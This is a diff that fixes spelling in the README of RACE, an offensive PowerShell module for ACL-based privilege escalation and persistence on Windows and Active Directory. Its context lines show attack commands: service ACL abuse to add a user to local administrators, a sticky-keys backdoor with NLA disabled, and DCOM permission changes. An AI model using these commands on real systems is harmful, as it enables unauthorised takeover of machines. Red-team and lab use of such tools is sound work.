@@ -1,5 +1,5 @@
 # RACE
-### RACE is a PowerShell module for executing ACL attacks against Windows targets and Active Directory. RACE can be used for persistence and on demand privilege escalationon Windows machines. 
+### RACE is a PowerShell module for executing ACL attacks against Windows targets and Active Directory. RACE can be used for persistence and on demand privilege escalation on Windows machines. 
 ### By [nikhil_mitt](https://twitter.com/nikhil_mitt)
 
 ### Usage
@@ -59,7 +59,7 @@ Use the above command to modify ACL of 'ALG' service on ops-mssql to allow labus
 PS C:\> Set-RemoteServiceAbuse -ComputerName ops-mssql -UserName 'labuser' -ServiceName ALG -Verbose
 ```
 Run the above command as 'labuser' to configure ALG to run as SYSTEM and modify its executable path to add 'labuser'
-or other Principal provided in the UserName parameter to the local adminisrators group on the target machines. 
+or other Principal provided in the UserName parameter to the local administrators group on the target machines. 
 
 ```powershell
 PS C:\> sc.exe \\ops-mssql start ALG
@@ -89,7 +89,7 @@ PS C:\> Invoke-RegistryAbuse -ComputerName ops-mssql -Method ImageFileExecution 
 Above command sets payload for sethc (sticky keys) and disables NLA.
 
 ### Set-DCOMPermissions and Invoke-DCOMAbuse
-Set-DCOMPermissions can be used to modify ACLs of DCOM provide non-admin Princiapls access to DCOM.
+Set-DCOMPermissions can be used to modify ACLs of DCOM provide non-admin Principals access to DCOM.
 
 ```powershell
 PS C:\> Set-DCOMPermissions -UserName labuser -ComputerName ops-mssql -Verbose 
